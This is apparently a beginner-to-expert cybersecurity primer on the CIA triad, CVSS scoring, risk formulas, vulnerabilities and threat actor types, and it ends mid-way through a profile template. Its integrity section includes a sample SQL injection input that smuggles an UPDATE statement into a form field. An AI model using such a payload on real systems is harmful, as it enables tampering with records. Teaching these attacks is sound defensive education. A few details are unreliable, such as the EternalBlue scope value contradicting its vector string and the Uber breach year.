
# 1. What is Cybersecurity?

## 1.1 Definition — Multiple Layers

**Simple Definition (Beginner):**
Cybersecurity is the practice of protecting computers, networks, programs, and data from digital attacks, damage, or unauthorized access.

**Technical Definition (Intermediate):**
Cybersecurity is the discipline encompassing the policies, processes, technologies, and human behaviors designed to protect digital systems, networks, and data against unauthorized access, use, disclosure, disruption, modification, or destruction — with the goal of preserving Confidentiality, Integrity, and Availability (CIA).

**Expert Definition:**
Cybersecurity is a multi-disciplinary field combining elements of computer science, risk management, law, behavioral psychology, and engineering to define, implement, and enforce a security posture across an organization's entire attack surface — including digital, physical, and human vectors — in alignment with regulatory requirements, business objectives, and threat intelligence.

---

## 1.2 Why Cybersecurity Matters

```
THE COST OF CYBERCRIME (Real World):
┌────────────────────────────────────────────────────────────┐
│  Global cybercrime costs: $8 TRILLION in 2023              │
│  Average data breach cost: $4.45 million (IBM 2023)        │
│  Time to identify a breach: 204 days (average)             │
│  Time to contain a breach: 73 days (average)               │
│  Ransomware attack every: 11 seconds                       │
│  Phishing accounts for: 90% of all data breaches           │
└────────────────────────────────────────────────────────────┘
```

### Real-World Consequences of Poor Cybersecurity:

| Incident | Year | Impact |
|----------|------|--------|
| Equifax Data Breach | 2017 | 147M people's PII exposed, $700M settlement |
| WannaCry Ransomware | 2017 | 200+ countries, $4B+ damage, NHS crippled |
| SolarWinds Supply Chain | 2020 | 18,000 orgs compromised incl. US government |
| Colonial Pipeline | 2021 | $4.4M ransom, US fuel supply disrupted |
| Log4Shell (Log4j) | 2021 | Billions of devices vulnerable overnight |
| Uber Data Breach | 2022 | 57M users, engineer bribed $100K to hide it |

---

## 1.3 The Scope of Cybersecurity

```
CYBERSECURITY IS NOT JUST "HACKING":

  ┌─────────────────────────────────────────────────────────┐
  │                  CYBERSECURITY                          │
  │                                                         │
  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
  │  │   Technical  │  │  Operational │  │   Human      │  │
  │  │              │  │              │  │              │  │
  │  │ • Firewalls  │  │ • Policies   │  │ • Awareness  │  │
  │  │ • Encryption │  │ • Procedures │  │ • Training   │  │
  │  │ • Pentesting │  │ • Monitoring │  │ • Culture    │  │
  │  │ • Code Review│  │ • Incident   │  │ • Phishing   │  │
  │  │ • Patching   │  │   Response   │  │   Resistance │  │
  │  └──────────────┘  └──────────────┘  └──────────────┘  │
  │                                                         │
  │  ┌──────────────┐  ┌──────────────┐                     │
  │  │   Physical   │  │  Compliance  │                     │
  │  │              │  │              │                     │
  │  │ • CCTV       │  │ • GDPR       │                     │
  │  │ • Locks      │  │ • ISO 27001  │                     │
  │  │ • Badges     │  │ • PCI-DSS    │                     │
  │  │ • Guards     │  │ • HIPAA      │                     │
  │  └──────────────┘  └──────────────┘                     │
  └─────────────────────────────────────────────────────────┘
```

---

## 1.4 Cybersecurity vs Information Security vs IT Security

These terms are often used interchangeably but have precise meanings:

| Term | Scope | Focus |
|------|-------|-------|
| **IT Security** | IT infrastructure | Protecting IT systems (servers, networks, endpoints) |
| **Information Security (InfoSec)** | All information | Protecting data in any form (digital AND physical/paper) |
| **Cybersecurity** | Cyber/digital domain | Protecting against cyber threats specifically (attacks via internet/networks) |

```
RELATIONSHIP:
┌─────────────────────────────────────────┐
│           Information Security          │
│  ┌───────────────────────────────────┐  │
│  │           IT Security             │  │
│  │  ┌────────────────────────────┐   │  │
│  │  │       Cybersecurity        │   │  │
│  │  └────────────────────────────┘   │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘

Cybersecurity ⊂ IT Security ⊂ Information Security
```

---

# 2. The CIA Triad

## 2.1 Overview

The CIA Triad is the **foundational model** of cybersecurity. Every security decision, every control, every policy ultimately traces back to protecting one or more of these three properties.

```
        CONFIDENTIALITY
             /\
            /  \
           /    \
          /      \
         /        \
        /    CIA   \
       /   TRIAD    \
      /______________\
INTEGRITY          AVAILABILITY
```

---

## 2.2 Confidentiality

### Definition
Confidentiality ensures that information is accessible ONLY to those authorized to access it. It prevents unauthorized disclosure of data.

### What it Protects Against:
- Unauthorized reading of files
- Eavesdropping on network traffic
- Data leaks and breaches
- Shoulder surfing
- Dumpster diving (paper documents)

### How Confidentiality is Achieved:

| Mechanism | How it Works | Example |
|-----------|-------------|---------|
| **Encryption** | Transforms data into unreadable form | AES-256 encrypting files at rest |
| **Access Control** | Restricts who can read data | RBAC (Role-Based Access Control) |
| **Authentication** | Verifies identity before granting access | MFA, passwords |
| **Data Classification** | Labels data by sensitivity | Top Secret, Confidential, Public |
| **Physical Security** | Locks rooms with sensitive data | Server room access cards |
| **Network Segmentation** | Isolates sensitive network zones | VLAN for finance department |
| **Steganography** | Hides data within other data | Secret message inside an image |
| **Data Masking** | Obfuscates sensitive data | Showing **** for credit card digits |

### Real Attack Against Confidentiality:
```
SCENARIO: Man-in-the-Middle Attack

  Employee (Victim)                   Attacker                   Bank Server
       │                                 │                            │
       │   HTTP GET /login               │                            │
       ├────────────────────────────────►│                            │
       │                                 │   HTTP GET /login          │
       │                                 ├───────────────────────────►│
       │                                 │◄───────────────────────────┤
       │   HTML response (with form)     │   HTML response            │
       │◄────────────────────────────────┤                            │
       │                                 │                            │
       │   POST /login user=bob&pass=123 │                            │
       ├────────────────────────────────►│ ← ATTACKER READS PASSWORD  │
       │                                 ├───────────────────────────►│

Confidentiality VIOLATED: Attacker captured credentials in transit.
Fix: Use HTTPS (TLS encryption) — attacker sees only encrypted gibberish.
```

### Confidentiality Metrics:
- **Data in Transit**: Is the network traffic encrypted? (TLS, VPN, SSH)
- **Data at Rest**: Are files encrypted on disk? (BitLocker, VeraCrypt, AES)
- **Data in Use**: Is data protected while being processed? (Memory encryption, TEE)

---

## 2.3 Integrity

### Definition
Integrity ensures that data and systems are accurate, complete, and have not been tampered with — either by unauthorized parties or through accidental corruption.

### What it Protects Against:
- Unauthorized modification of data
- Data corruption (hardware failure, transmission errors)
- SQL injection altering database records
- Man-in-the-Middle modification of data in transit
- Insider threats changing financial records
- Malware corrupting or encrypting files

### How Integrity is Achieved:

| Mechanism | How it Works | Example |
|-----------|-------------|---------|
| **Hashing** | Creates a fingerprint of data | SHA-256 hash of a file |
| **Digital Signatures** | Cryptographically signs data | Code signing certificates |
| **Checksums** | Simple integrity verification | MD5 hash of downloaded file |
| **Version Control** | Tracks changes to data/code | Git commit history |
| **Write Protection** | Prevents unauthorized writes | Read-only permissions |
| **WORM Storage** | Write Once Read Many | Legal record storage |
| **Audit Logs** | Records all changes with who/when/what | SIEM log trails |
| **Dual Control** | Requires two people to authorize changes | Nuclear launch codes |

### Integrity Attack Example:
```
SCENARIO: SQL Injection — Integrity Violation

Attacker submits in a banking app form:
  Transfer Amount: 100
  Account:         123456'; UPDATE accounts SET balance=99999 WHERE id=1; --

Database executes:
  SELECT * FROM transfers WHERE account = '123456';
  UPDATE accounts SET balance=99999 WHERE id=1; -- '

Result: Attacker changed bank balance — INTEGRITY VIOLATED.

Detection: Transaction logs, hash verification of records, anomaly detection.
```

### Integrity Verification — Hashing Demo:
```
SHA-256 Hash of "Hello World" (file intact):
  b94d27b9934d3e08a52e52d7da7dabfa...

SHA-256 Hash after changing ONE character to "hello World":
  64ec88ca00b268e5ba1a35678a1b5316...
  
Hashes are COMPLETELY DIFFERENT — even tiny changes are detectable.
This is why hash verification catches any tampering.
```

---

## 2.4 Availability

### Definition
Availability ensures that systems, data, and services are accessible to authorized users when needed. Downtime = violation of availability.

### What it Protects Against:
- Denial of Service (DoS/DDoS) attacks
- Hardware failures
- Natural disasters (floods, fires)
- Power outages
- Software bugs causing crashes
- Ransomware encrypting files (also violates confidentiality and integrity)

### How Availability is Achieved:

| Mechanism | How it Works | Example |
|-----------|-------------|---------|
| **Redundancy** | Duplicate critical components | RAID storage arrays |
| **Load Balancing** | Distributes traffic across multiple servers | Nginx load balancer |
| **Failover Systems** | Automatic switch to backup | Active-passive clustering |
| **Backups** | Copies of data stored separately | Offsite daily backups |
| **Disaster Recovery (DR)** | Plan to restore operations after incident | DR site in another city |
| **DDoS Protection** | Filters malicious traffic | Cloudflare DDoS mitigation |
| **UPS/Generator** | Power backup | Data center generators |
| **SLA Agreements** | Contractual uptime guarantees | 99.9% uptime SLA |
| **Patch Management** | Prevents crashes from known bugs | Automated patching |

### DDoS Attack — Availability Violation:
```
DISTRIBUTED DENIAL OF SERVICE:

  Bot 1 ──────────────────────────────────────────────►│
  Bot 2 ──────────────────────────────────────────────►│
  Bot 3 ──────────────────────────────────────────────►│  SERVER
  Bot 4 ──────────────────────────────────────────────►│  OVERWHELMED
  ...  ──────────────────────────────────────────────►│  (OFFLINE)
  Bot 10,000 ─────────────────────────────────────────►│

Attack: Thousands of bots send massive traffic — server runs out of
        resources (bandwidth, CPU, memory) and CRASHES.

Result: Legitimate users CANNOT access the service — Availability VIOLATED.

Famous DDoS: Mirai Botnet (2016) knocked out Twitter, Netflix, Reddit
             using 100,000+ IoT devices (cameras, routers).
```

### Availability Metrics:
- **RTO (Recovery Time Objective)**: How quickly must systems be restored?
- **RPO (Recovery Point Objective)**: How much data can you afford to lose?
- **MTTR (Mean Time to Repair)**: Average time to fix failures
- **MTBF (Mean Time Between Failures)**: How often do systems fail?
- **Uptime SLA**: 99.9% = 8.7 hours downtime/year; 99.99% = 52 minutes/year

---

## 2.5 Extended: Beyond CIA — Additional Security Properties

Modern security extends beyond the classic CIA triad:

| Property | Definition | Example |
|----------|-----------|---------|
| **Authenticity** | Data/identity is genuine, not forged | Digital certificates verifying a website |
| **Non-repudiation** | Cannot deny performing an action | Digital signature on a contract |
| **Accountability** | Actions are traceable to individuals | Audit logs with user IDs |
| **Privacy** | Control over personal information | GDPR compliance |
| **Reliability** | Systems perform as expected consistently | Software testing and QA |
| **Safety** | Systems don't cause physical harm | Medical device security |

---

## 2.6 CIA Attacks — Complete Reference Table

| Attack Type | CIA Violated | Description |
|-------------|-------------|-------------|
| Eavesdropping / Sniffing | C | Capturing network traffic |
| Man-in-the-Middle | C, I | Intercepting and modifying communications |
| Data Breach | C | Unauthorized data access/theft |
| SQL Injection (data theft) | C | Extracting database contents |
| SQL Injection (data modification) | I | Altering database records |
| Ransomware | C, I, A | Encrypts files, demands payment |
| DDoS | A | Overwhelms resources, causes downtime |
| Defacement | I | Unauthorized modification of website |
| Replay Attack | C, I | Capturing and resending valid data |
| Insider Threat | C, I, A | Trusted user abuses access |
| Physical Theft | C, A | Stealing hardware with data |
| Hardware Failure | A | System crashes from hardware fault |

---

# 3. CVSS — Common Vulnerability Scoring System

## 3.1 What is CVSS?

CVSS (Common Vulnerability Scoring System) is an open standard for assessing the severity of cybersecurity vulnerabilities. It provides a numerical score from **0.0 to 10.0** that reflects how severe a vulnerability is.

**Maintained by:** FIRST (Forum of Incident Response and Security Teams)  
**Current version:** CVSS v3.1 (v4.0 released 2023)  
**Used in:** NVD (National Vulnerability Database), CVE entries, vulnerability management tools

```
CVSS SCORE RANGES:
┌─────────────┬────────────┬──────────────────────────────────────┐
│ Score Range │ Severity   │ Action Required                      │
├─────────────┼────────────┼──────────────────────────────────────┤
│  0.0        │ None       │ Informational only                   │
│  0.1 – 3.9  │ Low        │ Patch in next scheduled cycle        │
│  4.0 – 6.9  │ Medium     │ Patch within 30–90 days              │
│  7.0 – 8.9  │ High       │ Patch within 7–14 days               │
│  9.0 – 10.0 │ Critical   │ PATCH IMMEDIATELY (emergency)        │
└─────────────┴────────────┴──────────────────────────────────────┘
```

---

## 3.2 CVSS v3.1 Metric Groups

CVSS is calculated from THREE groups of metrics:

```
CVSS = Base Score + Temporal Score + Environmental Score
         (required)   (optional)      (optional — org-specific)
```

### A. Base Score Metrics (The Core)

**Attack Vector (AV)** — How is the vulnerability exploited?
```
Network (N)      → Remotely exploitable over the internet          → WORST (score: 0.85)
Adjacent (A)     → Requires access to same network segment         → BAD   (score: 0.62)
Local (L)        → Requires local access (login) to the system     → LESS  (score: 0.55)
Physical (P)     → Requires physical access to the device          → BEST  (score: 0.20)
```

**Attack Complexity (AC)** — How difficult is the exploit?
```
Low (L)   → No special conditions needed — easy to repeat          → WORSE (score: 0.77)
High (H)  → Requires specific conditions, race conditions, etc.    → BETTER (score: 0.44)
```

**Privileges Required (PR)** — What access does the attacker need before exploiting?
```
None (N)  → No authentication needed                              → WORST  (score: 0.85)
Low (L)   → Basic user account required                           → BAD    (score: 0.62)
High (H)  → Admin/root account required                           → BETTER (score: 0.27)
```

**User Interaction (UI)** — Does the attack require a victim to do something?
```
None (N)   → Attacker can exploit without user doing anything     → WORSE  (score: 0.85)
Required (R) → User must click a link, open a file, etc.          → BETTER (score: 0.62)
```

**Scope (S)** — Does the impact extend beyond the vulnerable component?
```
Unchanged (U) → Impact only on the vulnerable component           → WORSE
Changed (C)   → Impact on other components (container escape!)    → WORSE+
```

**Impact Metrics (CIA)** — What is the impact?
```
Confidentiality Impact:
  None (N) → No confidentiality loss
  Low (L)  → Some restricted info exposed
  High (H) → All data exposed (score: 0.56)

Integrity Impact:
  None (N) → No data modification possible
  Low (L)  → Some limited modification
  High (H) → Total integrity loss (score: 0.56)

Availability Impact:
  None (N) → No availability impact
  Low (L)  → Reduced performance
  High (H) → Total shutdown (score: 0.56)
```

---

## 3.3 CVSS Score Calculation — Step by Step

### Example: EternalBlue (MS17-010) — CVE-2017-0144

This vulnerability was used in the WannaCry and NotPetya attacks.

```
Metric               Value    Score
─────────────────────────────────────
Attack Vector:       Network  0.85
Attack Complexity:   Low      0.77
Privileges Required: None     0.85
User Interaction:    None     0.85
Scope:               Changed  (multiplier change)
Confidentiality:     High     0.56
Integrity:           High     0.56
Availability:        High     0.56

CVSS Base Score: 9.8 — CRITICAL

Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

### CVSS Vector String Format:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
   │      │   │   │   │   │   │   │   │   └─ Availability: High
   │      │   │   │   │   │   │   │   └───── Integrity: High
   │      │   │   │   │   │   │   └───────── Confidentiality: High
   │      │   │   │   │   │   └───────────── Scope: Unchanged
   │      │   │   │   │   └───────────────── User Interaction: None
   │      │   │   │   └───────────────────── Privileges Required: None
   │      │   │   └───────────────────────── Attack Complexity: Low
   │      │   └───────────────────────────── Attack Vector: Network
   │      └───────────────────────────────── Version 3.1
   └──────────────────────────────────────── CVSS prefix
```

---

## 3.4 Temporal Score Metrics (Time-Sensitive)

Temporal metrics reflect how a vulnerability changes over time:

| Metric | Values | Meaning |
|--------|--------|---------|
| **Exploit Code Maturity (E)** | Not Defined / Unproven / POC / Functional / High | Is working exploit publicly available? |
| **Remediation Level (RL)** | Not Defined / Official Fix / Temporary Fix / Workaround / Unavailable | Is there a patch? |
| **Report Confidence (RC)** | Not Defined / Unknown / Reasonable / Confirmed | How certain is the vulnerability? |

```
Example Impact of Temporal Score:

Vulnerability at discovery (no public exploit):
  Base: 9.8 → Temporal: 8.5 (slightly reduced — exploit not confirmed)

After PoC exploit released publicly:
  Base: 9.8 → Temporal: 9.4 (increased — now easily weaponized)

After official patch released:
  Base: 9.8 → Temporal: 7.2 (reduced — remediation available)
```

---

## 3.5 Environmental Score — Organization-Specific

Environmental metrics let organizations adjust the CVSS score based on their specific context:

| Metric                          | Meaning                                          |
| ------------------------------- | ------------------------------------------------ |
| **Confidentiality Requirement** | How important is confidentiality for THIS asset? |
| **Integrity Requirement**       | How important is integrity for THIS asset?       |
| **Availability Requirement**    | How important is availability for THIS asset?    |
| **Modified Base Metrics**       | Override base metrics for your environment       |

```
Example:
Vulnerability in a database server:
  Generic CVSS Base: 7.5 (High)
  
Our database holds medical records (very high confidentiality requirement):
  Environmental Score: 9.2 (Critical) — we treat it more seriously
  
Our database is an internal test server (low importance):
  Environmental Score: 5.1 (Medium) — we treat it less urgently
```

---

## 3.6 CVSS in Practice — Vulnerability Management

```
VULNERABILITY MANAGEMENT WORKFLOW:

New CVE Published
       │
       ▼
  Parse CVSS Score
       │
       ├──► Score 9.0–10.0 (Critical) ──► Emergency patch within 24–72 hours
       ├──► Score 7.0–8.9 (High)      ──► Patch within 7 days
       ├──► Score 4.0–6.9 (Medium)    ──► Patch within 30 days
       └──► Score 0.1–3.9 (Low)       ──► Next patch cycle (90 days)

Also consider:
  - Is there a public exploit? (Exploit DB, Metasploit module exists)
  - Is this asset internet-facing? (Increases priority)
  - Is asset in scope for compliance? (HIPAA, PCI-DSS → higher priority)
  - Is asset critical to business operations? (Higher priority)
```

---

## 3.7 CVSS vs CVSS v4.0 — Key Changes

| Feature | CVSS v3.1 | CVSS v4.0 |
|---------|-----------|-----------|
| Metric groups | 3 (Base/Temporal/Environmental) | 4 (Base/Threat/Environmental/Supplemental) |
| Temporal → Threat | "Temporal" metrics | Renamed "Threat" metrics |
| Supplemental metrics | Not present | Added: Safety, Automatable, Recovery, Value Density |
| OT/ICS focus | Limited | Explicit Safety metric for operational tech |
| Nomenclature | Score names only | Severity naming aligned to FIRST |

---

## 3.8 Related Scoring Systems

| System | Purpose | Score Range |
|--------|---------|-------------|
| **CVSS** | Vulnerability severity | 0.0–10.0 |
| **EPSS** (Exploit Prediction Scoring System) | Probability of exploitation in 30 days | 0%–100% |
| **CCSS** (Common Configuration Scoring System) | Configuration weaknesses | 0.0–10.0 |
| **CWSS** (Common Weakness Scoring System) | Software weakness severity | 0.0–100 |
| **CMSS** (Common Misuse Scoring System) | Feature misuse scenarios | Experimental |

---

# 4. Risk Score & Risk Fundamentals

## 4.1 What is Risk?

**Beginner Definition:**
Risk is the chance that something bad will happen — and how bad it would be if it did.

**Technical Definition:**
Risk is the potential for loss, damage, or destruction of an asset resulting from a threat exploiting a vulnerability, measured by the combination of the likelihood of occurrence and the magnitude of the impact.

```
RISK = LIKELIHOOD × IMPACT

Simple Example:
  You leave your laptop on a coffee shop table and walk away.
  
  Likelihood of theft:  HIGH (unattended in public = 70% chance)
  Impact of theft:      HIGH (all your work data lost = massive loss)
  
  RISK = HIGH × HIGH = VERY HIGH RISK
  
  If you had used disk encryption:
    Likelihood of theft: Still HIGH (70%)
    Impact of theft:     LOW (thief can't read the data)
    RISK = HIGH × LOW = MEDIUM RISK
  
  Controls REDUCE RISK by reducing likelihood OR impact.
```

---

## 4.2 The Risk Score Formula

### Formula 1: Basic
```
RISK = PROBABILITY × IMPACT
```

### Formula 2: Asset-Based
```
        A × V × T
R =    ───────────
            C

Where:
  R = Risk value
  A = Asset value (how valuable/critical is the asset?)
  V = Vulnerability score (how severe is the weakness?)
  T = Threat score (how capable/motivated is the threat?)
  C = Control effectiveness (how well do controls reduce risk?)
```

### Formula 3: Annual Loss Expectancy (Quantitative)
```
ALE = SLE × ARO

Where:
  ALE = Annual Loss Expectancy (expected $ loss per year)
  SLE = Single Loss Expectancy ($ loss per single incident)
  ARO = Annualized Rate of Occurrence (how many times/year?)

Example:
  A web server gets DDoSed on average 3 times per year.
  Each DDoS causes 4 hours of downtime.
  Revenue loss per hour = $50,000.
  
  SLE = 4 hours × $50,000 = $200,000
  ARO = 3 times/year
  ALE = $200,000 × 3 = $600,000/year
  
  Is a $300,000 DDoS mitigation solution worth it? YES.
    Because: ALE ($600K) > Control Cost ($300K) → implement it.
```

---

# 5. Core Cybersecurity Terms & Concepts

## 5.1 Asset

### Definition
An **asset** is anything of value to an organization that needs to be protected. Assets can be tangible (physical) or intangible (digital/informational).

### Asset Categories:

```
ASSET TYPES:

┌─────────────────────────────────────────────────────────┐
│                      ASSETS                             │
│                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │   Hardware   │  │   Software   │  │     Data     │  │
│  │              │  │              │  │              │  │
│  │ • Servers    │  │ • OS         │  │ • Customer   │  │
│  │ • Laptops    │  │ • Applications│ │   records    │  │
│  │ • Routers    │  │ • Databases  │  │ • Financial  │  │
│  │ • Switches   │  │ • Firmware   │  │   data       │  │
│  │ • IoT Devices│  │ • Source Code│  │ • Credentials│  │
│  └──────────────┘  └──────────────┘  └──────────────┘  │
│                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │   People     │  │  Processes   │  │  Reputation  │  │
│  │              │  │              │  │              │  │
│  │ • Employees  │  │ • Business   │  │ • Brand image│  │
│  │ • Contractors│  │   workflows  │  │ • Customer   │  │
│  │ • Customers  │  │ • IT ops     │  │   trust      │  │
│  │ • Partners   │  │ • Dev pipelines│ • Market     │  │
│  └──────────────┘  └──────────────┘  │   position   │  │
│                                       └──────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Asset Valuation

Assets must be valued to prioritize protection. Methods:

| Method                 | Description                          | Example                                   |
| ---------------------- | ------------------------------------ | ----------------------------------------- |
| **Replacement Cost**   | Cost to replace the asset if lost    | Server costs $15,000 to replace           |
| **Business Impact**    | Revenue loss if asset is unavailable | $50,000/hour if e-commerce site goes down |
| **Regulatory Value**   | Fines if data is breached            | GDPR fine up to €20M for customer PII     |
| **Reputational Value** | Brand damage cost                    | Stock price drop after breach             |

### Critical Asset Examples (Crown Jewels):
```
CROWN JEWELS (Most critical assets in any organization):
  1. Domain Controller (Active Directory) — controls ALL user accounts
  2. Certificate Authority — controls ALL digital trust
  3. Customer PII database — contains all personal data
  4. Financial transaction systems — direct monetary impact
  5. Source code repositories — intellectual property
  6. Backup systems — last line of defense against ransomware
  7. SCADA/ICS systems — physical world consequences
```

---

## 5.2 Vulnerability

### Definition
A **vulnerability** is a weakness, flaw, or gap in a system, application, process, or control that can be exploited by a threat actor to compromise the system's security.

```
BEGINNER ANALOGY:
  Vulnerability = A crack in the wall of your fortress
  The wall exists (some security), but there's a gap.
  Anyone who finds the gap can enter.
```

### Types of Vulnerabilities:

**Technical Vulnerabilities:**
```
SOFTWARE:
  • Buffer Overflow        — Writing beyond allocated memory boundaries
  • SQL Injection          — Malicious SQL code in user input
  • Cross-Site Scripting   — Injecting scripts into web pages
  • Insecure Deserialization — Untrusted data executed as code
  • Path Traversal         — Accessing files outside allowed directory
  • Hardcoded Credentials  — Passwords embedded in source code
  • Outdated Software      — Unpatched known vulnerabilities
  • Weak Cryptography      — Using MD5, SHA1, DES (broken algorithms)
  • Missing Authentication — Endpoints accessible without login
  • Race Conditions        — Exploiting timing gaps in concurrent processes
  
NETWORK:
  • Open Ports             — Unnecessary services exposed
  • Weak Protocols         — Using HTTP instead of HTTPS, Telnet instead of SSH
  • Default Credentials    — admin/admin, admin/password
  • Misconfigured Firewall — Rules too permissive
  • Missing Encryption     — Data transmitted in plaintext
  
CONFIGURATION:
  • Excessive Permissions  — Users have more access than needed
  • Default Settings       — Factory defaults not changed
  • Debug Mode Enabled     — Exposes error details and test interfaces
  • Backup Files Exposed   — database.bak accessible on web server
```

**Human Vulnerabilities:**
```
  • Susceptibility to Phishing    — Clicking malicious links
  • Weak Password Habits          — Password123, reusing passwords
  • Lack of Security Awareness    — Not knowing what's suspicious
  • Tailgating / Social Engineering — Being tricked into granting access
  • Oversharing on Social Media   — Revealing info useful to attackers
```

**Process Vulnerabilities:**
```
  • No Patch Management Process   — Updates never applied
  • No Access Review              — Former employees still have access
  • No Change Management          — Changes made without testing security
  • No Incident Response Plan     — No plan when breach occurs
  • No Backup Policy              — No tested backups exist
```

### Vulnerability Lifecycle:
```
VULNERABILITY LIFECYCLE:

 Discovery          Disclosure         Patching           End of Life
     │                  │                 │                   │
     ▼                  ▼                 ▼                   ▼
 ┌───────┐         ┌─────────┐       ┌────────┐         ┌─────────┐
 │Vendor │ 90-day  │Researcher│ patch │ Vendor │ deploy  │ All sys │
 │ told  │ window  │ publishes│ ready │releases│ patch   │ patched │
 └───────┘ ──────► └─────────┘ ────► └────────┘ ──────► └─────────┘
                        │                                    │
                   Zero Day Window                    Old vuln remains
                  (if vendor doesn't               for unpatched systems
                   fix in 90 days)
```

### Common Vulnerability Databases:
| Database | URL | Description |
|----------|-----|-------------|
| **NVD** | nvd.nist.gov | National Vulnerability Database — authoritative |
| **CVE** | cve.mitre.org | Common Vulnerabilities and Exposures — naming standard |
| **Exploit-DB** | exploit-db.com | Exploit code archive |
| **VulDB** | vuldb.com | Vulnerability intelligence database |
| **SecurityFocus** | securityfocus.com | BugTraq mailing list archive |

---

## 5.3 Threat

### Definition
A **threat** is any potential event, circumstance, or actor with the capability and intent to exploit a vulnerability and cause harm to an asset.

```
BEGINNER ANALOGY:
  Vulnerability = Crack in fortress wall
  Threat        = The enemy army that might use that crack
  
  Just having a crack doesn't guarantee attack.
  You need BOTH a crack AND someone who wants to use it.
```

### Threat Categories:

```
THREAT TAXONOMY:

┌───────────────────────────────────────────────────────────┐
│                    THREATS                                │
│                                                           │
│  INTENTIONAL                    UNINTENTIONAL             │
│  (Deliberate attacks)           (Accidental)              │
│  ┌─────────────────┐            ┌─────────────────┐       │
│  │ • Hacking        │           │ • Human error   │       │
│  │ • Malware        │           │ • Misconfiguration│     │
│  │ • Phishing       │           │ • Hardware fault │       │
│  │ • Insider threat │           │ • Software bug  │       │
│  │ • Social Eng.    │           │ • Data loss     │       │
│  │ • Physical theft │           │ • Natural disaster│     │
│  └─────────────────┘            └─────────────────┘       │
│                                                           │
│  EXTERNAL                       INTERNAL                  │
│  (Outside organization)         (Within organization)     │
│  ┌─────────────────┐            ┌─────────────────┐       │
│  │ • Nation-states  │           │ • Disgruntled   │       │
│  │ • Cybercriminals │           │   employees     │       │
│  │ • Hacktivists    │           │ • Negligent     │       │
│  │ • Script kiddies │           │   staff         │       │
│  │ • Competitors    │           │ • Contractors   │       │
│  └─────────────────┘            └─────────────────┘       │
└───────────────────────────────────────────────────────────┘
```

### Threat Intelligence:
```
THREAT INTELLIGENCE = Knowledge about threats to help make better decisions.

Strategic Intelligence: High-level trends (nation-state activity, industry targeting)
Operational Intelligence: Specific campaigns, TTPs (Tactics, Techniques, Procedures)
Tactical Intelligence: IOCs (Indicators of Compromise — IP addresses, hashes, domains)
Technical Intelligence: Malware samples, exploit code

Sources:
  • MITRE ATT&CK Framework (attack.mitre.org)
  • OSINT (Open Source Intelligence)
  • ISACs (Information Sharing and Analysis Centers)
  • Commercial feeds (Recorded Future, CrowdStrike Intel)
  • Government advisories (CISA, NCSC, BSI)
```

---

## 5.4 Threat Actors

### Definition
A **threat actor** (also called an adversary) is any individual, group, or entity that has the capability, intent, and opportunity to conduct malicious activities against a target.

### Threat Actor Categories:

**1. Nation-State Actors (APTs — Advanced Persistent Threats)**
```
Characteristics:
  • Funded by governments
  • Highly sophisticated, well-resourced
  • Long-term, stealthy operations (months to years)
  • Targets: critical infrastructure, intelligence, IP theft
  • Use custom malware, zero-days, supply chain attacks

Examples:
  APT28 (Fancy Bear)    — Russia — Targets NATO, elections
  APT41 (Double Dragon) — China — Espionage + financial crime
  Lazarus Group         — North Korea — Financial theft ($1.7B stolen)
  OilRig (APT34)        — Iran — Middle East espionage
  Equation Group        — USA (NSA TAO) — EternalBlue creator
```

**2. Cybercriminal Organizations**
```
Characteristics:
  • Financially motivated
  • Operate as organized businesses (RaaS, affiliates, brokers)
  • Use well-known tooling and TTP
  • Targets: any organization that can pay ransom or has financial data

Examples:
  REvil/Sodinokibi      — Ransomware-as-a-Service, $70M Kaseya ransom
  Conti                 — Ransomware group, $180M revenue before shutdown
  FIN7                  — Point-of-sale malware, $1B+ stolen
  Carbanak               — Banking trojans, $1B from banks
```

**3. Hacktivists**
```
Characteristics:
  • Politically or ideologically motivated
  • Less sophisticated than APTs, but can cause significant damage
  • Public facing attacks (defacement, DDoS, data leaks)
  • Targets: governments, corporations, media they disagree with

Examples:
  Anonymous            — Distributed hacktivist collective
  LulzSec              — 50 Days of Lulz campaign, Sony, HBGary
  KillNet              — Pro-Russia DDoS attacks on Western infrastructure
```

**4. Insider Threats**
```
Characteristics:
  • Authorized access = bypasses many perimeter controls
  • Most dangerous and hardest to detect
  • Motives: financial gain, revenge, coercion, ideology, negligence

Types:
  Malicious Insider   — Intentionally sabotages or steals
  Negligent Insider   — Accidentally causes harm (clicking phishing)
  Compromised Insider — Account taken over by attacker

Real Cases:
  Edward Snowden (2013)  — NSA contractor, leaked classified documents
  Chelsea Manning (2010) — Military analyst, WikiLeaks
  Morgan Stanley (2022)  — Advisor stole 15M client records to sell
```

**5. Script Kiddies**
```
Characteristics:
  • Low skill, use pre-built tools without understanding them
  • Opportunistic — attack low-hanging fruit
  • Can still cause damage despite low sophistication
  • Targets: anything publicly exposed and unpatched

Tools used: Metasploit, SQLmap, Kali Linux tutorials, GitHub exploits
```

**6. Competitors / Corporate Espionage**
```
Characteristics:
  • Corporate espionage — steal trade secrets, R&D, customer lists
  • Often use hired hackers or compromised insiders
  • Difficult to attribute

Example: Sinovel Wind Group stole source code from AMSC — $800M lawsuit
```

---

## 5.5 Threat Actor Profile

A **Threat Actor Profile** is a structured description of a threat actor's capabilities, motivations, and behaviors used for threat modeling and intelligence.

### Components of a Threat Actor Profile:

```
THREAT ACTOR PROFILE TEMPLATE:

═══════════════════════════════════════════════════
THREAT ACTOR: [Name / Alias]
═══════════════════════════════════════════════════
Classification:    [Nation-State / Criminal / Hacktivist / Insider]
Attribution:       [Country / Organization]
Active Since:      [Year]
Sophistication:    [Low / Medium / High / Very High]

MOTIVATION:
  Primary:   [Financial / Espionage / Disruption / Ideology]
  Secondary: [Reputation / Coercion / Revenge]

TARGETS:
  Industries:  [Finance / Healthcare / Government / Defense]
  Geography:   [Global / Regional / Specific countries]
  Asset Types: [Data / Systems / Infrastructure]

TACTICS, TECHNIQUES, PROCEDURES (TTPs):
  Initial Access:       [Phishing / Supply Chain / Exploit]
  Execution:            [PowerShell / Scripting / Native tools]
  Persistence:          [Registry / Services / Scheduled Tasks]
  Privilege Escalation: [Kernel exploit / Token manipulation]
